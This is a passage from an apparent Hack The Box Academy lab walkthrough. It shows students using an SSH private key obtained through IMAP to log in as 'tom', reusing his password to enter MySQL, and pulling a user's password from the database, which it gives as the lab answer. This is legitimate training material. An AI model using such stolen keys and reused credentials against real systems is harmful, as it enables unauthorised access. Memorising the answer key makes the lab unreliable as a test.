-----END OPENSSH PRIVATE KEY-----
)
1337 OK Fetch completed (0.004 + 0.000 + 0.003 secs).
```

Students need to then save the SSH private key into a file and change its permissions to 600:

```shell
chmod 600 id_rsa
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

Then, use it to connect over SSH as the user `tom`:

```shell
ssh -i id_rsa tom@STMIP
```

```shell-session
┌─[us-academy-1]─[10.10.14.41]─[htb-ac413848@htb-tphppderas]─[~]
└──╼ [★]$ ssh -i id_rsa tom@10.129.78.175

The authenticity of host '10.129.78.175 (10.129.78.175)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.78.175' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
<SNIP>

tom@NIXHARD:~$
```

Afterward, students need to connect to the `MySQL` database on the spawned target using the same credentials `tom:NMds732Js2761`:

```shell
mysql -u tom -pNMds732Js2761
```

```shell-session
tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761

mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Once connected, students need to use the `users` database, and then retrieve all columns for the user `HTB`, finding the password `cr3n4o7rzse7rzhnckhssncif7ds`:

```sql
use users;
SELECT * FROM users WHERE username='HTB';
```

```sql
mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

mysql> SELECT * FROM users WHERE username='HTB';
+------+----------+------------------------------+
| id   | username | password                     |
+------+----------+------------------------------+
|  150 | HTB      | cr3n4o7rzse7rzhnckhssncif7ds |
+------+----------+------------------------------+
1 row in set (0.01 sec)
```

Answer: `cr3n4o7rzse7rzhnckhssncif7ds`